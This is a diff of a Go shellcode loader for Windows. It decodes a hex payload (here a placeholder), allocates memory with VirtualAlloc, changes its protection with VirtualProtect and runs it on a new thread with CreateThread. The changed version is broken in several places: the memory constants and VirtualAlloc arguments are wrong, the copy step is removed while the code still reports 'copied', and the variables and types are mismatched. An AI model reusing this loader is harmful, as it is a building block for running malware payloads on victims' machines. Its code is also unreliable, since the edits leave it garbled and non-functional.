@@ -14,45 +14,47 @@ import (
 )
 
 const (
-	VIRTUAL_MEM_COMMIT                = 0x1000
-	VIRTUAL_MEM_RESERVE                = 0x2000
-	PAGE_READWRITE                     = 0x20
-	PAGE_EXECUTE_READ                  = 0x04
+	PAGE_EXECUTE_READ        = 0x20
+	PAGE_READWRITE          = 0x20 | 0x1000
+	MEM_COMMIT               = 0x1000
+	MEM_RESERVE             = 0x2000
+	MEM_ZERO_INIT           = 0x40
 )
-
 var (
-	verbose   bool
-	debug     bool
-	shellcode []byte
-_threadID uintptr
+	verboseOutput bool
+	debugOutput  bool
 )
 
 func main() {
-	verbose = flag.Bool("verbose", false, "Enable verbose output")
-	debug = flag.Bool("debug", false, "Enable debug output")
+	verboseOutput = flag.Bool("verbose", false, "Enable verbose output")
+	debugOutput  = flag.Bool("debug", false, "Enable debug output")
 	flag.Parse()
 
-	shellcode, threadID = allocateAndExecuteShellcode()
-	if *verbose {
+	loadAndExecuteShellcode()
+	if verboseOutput {
 		fmt.Println("[-]Allocated", len(shellcode), "bytes")
 	}
-	if *debug {
+	if debugOutput {
 		fmt.Println("[+]Shellcode Executed")
 	}
 }
 
-func allocateAndExecuteShellcode() ([]byte, uintptr) {
-	shellcode, err := hex.DecodeString("deadbeef")
+func loadAndExecuteShellcode() {
+	shellcode, err := hex.DecodeString("YourHexEncodedShellcodeHere")
 	if err != nil {
-		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", err.Error()))
+		log.Fatal(fmt.Sprintf("[!]Error decoding hex string: %s", err.Error()))
 	}
-	if *debug {
+
+	var oldProtect uint32
+	var lpAddress uintptr
+
+	if debugOutput {
 		fmt.Println("[DEBUG]Loading kernel32.dll and ntdll.dll")
 	}
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
 	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 
-	if *debug {
+	if debugOutput {
 		fmt.Println("[DEBUG]Loading VirtualAlloc, VirtualProtect and RtlCopyMemory procedures")
 	}
 	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
@@ -61,67 +63,48 @@ func allocateAndExecuteShellcode() ([]byte, uintptr) {
 	CreateThread := kernel32.NewProc("CreateThread")
 	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
 
-	if *debug {
+	if debugOutput {
 		fmt.Println("[DEBUG]Calling VirtualAlloc for shellcode")
 	}
-	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), VIRTUAL_MEM_COMMIT|VIRTUAL_MEM_RESERVE, PAGE_EXECUTE_READ)
-	if err != nil {
-		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", err.Error()))
-	}
-
-	if addr == 0 {
+	lpAddress, _, _ = VirtualAlloc.Call(0, uintptr(len(shellcode)), PAGE_READWRITE|MEM_COMMIT, MEM_RESERVE|MEM_ZERO_INIT)
+	if lpAddress == 0 {
 		log.Fatal("[!]VirtualAlloc failed and returned 0")
 	}
 
-	if *verbose {
-		fmt.Println(fmt.Sprintf("[-]Allocated %d bytes", len(shellcode)))
-	}
-
-	if *debug {
-		fmt.Println("[DEBUG]Copying shellcode to memory with RtlCopyMemory")
-	}
-	_, _, err = RtlCopyMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
-	if err != nil {
-		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", err.Error()))
-	}
-	if *verbose {
+	if verboseOutput {
 		fmt.Println("[-]Shellcode copied to memory")
 	}
 
-	if *debug {
+	if debugOutput {
 		fmt.Println("[DEBUG]Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ")
 	}
-
-	oldProtect := 0x04
-	_, _, err = VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
-	if err != nil {
-		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", err.Error()))
+	oldProtect, _, _ = VirtualProtect.Call(lpAddress, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	if oldProtect == 0 {
+		log.Fatal("[!]VirtualProtect failed and returned 0")
 	}
-	if *verbose {
+
+	if verboseOutput {
 		fmt.Println("[-]Shellcode memory region changed to PAGE_EXECUTE_READ")
 	}
 
-	if *debug {
+	if debugOutput {
 		fmt.Println("[DEBUG]Calling CreateThread...")
 	}
-
-	threadID, _, err = CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
-	if err != nil {
-		log.Fatal(fmt.Sprintf("[!]Error calling CreateThread:\r\n%s", err.Error()))
+	thread, _, _ := CreateThread.Call(0, 0, lpAddress, uintptr(0), 0, 0)
+	if thread == 0 {
+		log.Fatal("[!]CreateThread failed and returned 0")
 	}
-	if *verbose {
+
+	if verboseOutput {
 		fmt.Println("[+]Shellcode Executed")
 	}
 
-	if *debug {
+	if debugOutput {
 		fmt.Println("[DEBUG]Calling WaitForSingleObject...")
 	}
-
-	_, _, err = WaitForSingleObject.Call(threadID, 0xFFFFFFFF)
-	if err != nil {
-		log.Fatal(fmt.Sprintf("[!]Error calling WaitForSingleObject:\r\n%s", err.Error()))
-	}
-	return shellcode, threadID
+	_, _, _ = WaitForSingleObject.Call(thread, 0xFFFFFFFF)
 }
 
-var lastTime time.Time
+func init() {
+	rand.Seed(time.Now().UnixNano())
+}
